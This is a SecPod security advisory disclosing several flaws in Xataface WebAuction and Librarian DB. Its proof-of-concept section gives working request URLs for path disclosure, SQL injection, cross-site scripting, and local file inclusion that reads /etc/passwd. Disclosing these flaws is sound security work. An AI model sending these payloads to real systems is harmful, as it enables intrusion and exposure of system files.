@@ -1,0 +1,164 @@
+##############################################################################
+#
+# Title    : Xataface WebAuction and Xataface Librarian DB Multiple Vulnerabilities.
+# Author   : Antu Sanadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://xataface.com/
+# Advisory : http://secpod.org/blog/?p=350
+#            http://secpod.org/advisories/SECPOD_Xataface_Webauction_Mult_Vuln.txt
+# Software : Xataface WebAuction v0.3.6 and prior, 
+#            Xataface Librarian DB v0.2 and prior.
+# Date     : 09/07/2011
+#
+###############################################################################
+
+SecPod ID: 1024					21/07/2011 Issue Discovered
+						03/08/2011 Vendor Notified
+						No Response from Vendor
+						07/09/2011 Advisory Released
+
+Class: Multiple Vulnerabilities			Severity: High
+
+
+Overview:
+---------
+Xataface WebAuction and Xataface Librarian DB Multiple Vulnerabilities.
+
+
+Technical Description:
+----------------------
+Xataface WebAuction and Xataface Librarian DB Multiple Vulnerabilities.
+
+ i)  Input passed via the '-action' parameter in 'index.php' is not properly
+     verified. This can be exploited to read complete installation path.
+     
+ ii) Input passed via the 'list&-table' and '-action' parameter in 'index.php'
+     page is not properly verified before being used in an SQL query. This can
+     be exploited to manipulate SQL queries by injecting arbitrary SQL queries.
+
+iii) Input passed via the '-action' nad 'list&-table' parameter in 'index.php'
+     page is not properly verified before it is returned to the user. This can
+     be exploited to execute arbitrary HTML and script code in a user's browser
+     session in the context of a vulnerable site.
+
+iV)  Input passed via the 'list&-lang' and '-table' parameter in 'index.php'
+     page is not properly verified before it is returned to the user. This
+     can be exploited to execute arbitrary HTML and script code in a user's
+     browser session in the context of a vulnerable site.
+
+ V)  Input passed via the 'list&-lang' parameter in 'index.php' is not
+     properly verified beofore using it to include files. This can be
+     exploited to include arbitrary files from external and local resources.
+
+The vulnerabilities are tested in Xataface WebAuction v0.3.6,
+Xataface WebAuction v0.3.5, Xataface Librarian DB v0.2 and
+Xataface Librarian DB v0.1.3. Other versions  may also be affected.
+
+
+Impact:
+--------
+Successful exploitation could allow an attacker to execute arbitrary HTML
+code in a user's browser session in the context of a vulnerable application
+or to manipulate SQL queries by injecting arbitrary SQL code or to include
+arbitrary files from external and local resources.
+
+
+Affected Software:
+------------------
+Xataface WebAuction v0.3.6 and prior,
+Xataface Librarian DB v0.2 and prior.
+
+
+Tested on,
+Xataface WebAuction v0.3.6,
+Xataface WebAuction v0.3.5,
+Xataface Librarian DB v0.2,
+Xataface Librarian DB v0.1.3
+
+
+References:
+-----------
+http://xataface.com/
+http://secpod.org/blog/?p=350
+http://sourceforge.net/projects/librariandb/
+http://sourceforge.net/projects/webauction/files/webauction/
+http://secpod.org/blog/?p=350
+http://secpod.org/advisories/SECPOD_Xataface_Webauction_Mult_Vuln.txt
+
+
+Proof of Concept:
+-----------------
+
+POC 1:
+-----
+Full Path Disclosure Vulnerability
+
+http://IP_ADDR/webauction/index.php?-action=%27
+http://IP_ADDR/librariandb/index.php?-action=%27
+
+POC 2:
+-----
+SQL Injection Vulnerabilities.
+
+http://IP_ADDR/webauction/index.php?-table=%27
+http://IP_ADDR/webauction/index.php?-action=list&-table=%27
+http://IP_ADDR/librariandb/index.php?-table=%27
+http://IP_ADDR/librariandb/index.php?-action=list&-table=%27
+
+POC 3:
+-----
+Cross Site Scripting Vulnerabilities.
+
+http://IP_ADDR/webauction/index.php?-action=list&-table=%3Cscript%3Ealert
+%28%22SecPod-XSS-TEST%22%29%3C/script%3E
+
+http://IP_ADDR/webauction/index.php?-table=books&-action=browse_by_cat&-cursor
+=0&-skip=0&-limit=30&-mode=list&-lang=%27%3Cscript%3Ealert%28%22SecPod-XSS-TEST
+%22%29%3C/script%3E
+Vist : http://IP_ADDR/webauction/index.php to see execut injected code
+
+http://IP_ADDR/librariandb/index.php?-action=list&-table=%3Cscript%3Ealert%28
+%22SecPod-XSS-TEST%22%29%3C/script%3E
+
+http://IP_ADDR/librariandb/index.php?-table=books&-action=browse_by_cat&-cursor
+=0&-skip=0&-limit=30&-mode=list&-lang=%27%3Cscript%3Ealert%28%22SecPod-XSS-TEST
+%22%29%3C/script%3E
+
+POC 4:
+-----
+Local File Inclusion Vulnerability.
+
+http://IP_ADDR/webauction/index.php?-table=books&-action=browse_by_cat&-cursor
+=0&-skip=0&-limit=30&-mode=list&-lang=../../../../../../../../../etc/passwd%00
+Vist : http://IP_ADDR/webauction/index.php to see the content of "/etc/passwd"
+file
+
+
+http://IP_ADDR/librariandb/index.php?-table=books&-action=browse_by_cat&-cursor
+=0&-skip=0&-limit=30&-mode=list&-lang=../../../../../../../../../etc/passwd%00
+
+
+Solution:
+----------
+Fix not available
+
+
+Risk Factor:
+-------------
+    CVSS Score Report:
+        ACCESS_VECTOR          = NETWORK
+        ACCESS_COMPLEXITY      = LOW
+        AUTHENTICATION         = NONE
+        CONFIDENTIALITY_IMPACT = PARTIAL
+        INTEGRITY_IMPACT       = PARTIAL
+        AVAILABILITY_IMPACT    = NONE
+        EXPLOITABILITY         = PROOF_OF_CONCEPT
+        REMEDIATION_LEVEL      = UNAVAILABLE
+        REPORT_CONFIDENCE      = CONFIRMED
+        CVSS Base Score        = 6.4 (High) (AV:N/AC:L/Au:N/C:P/I:P/A:N)
+
+
+Credits:
+--------
+Antu Sanadi of SecPod Technologies has been credited with the discovery of this
+vulnerability.
+
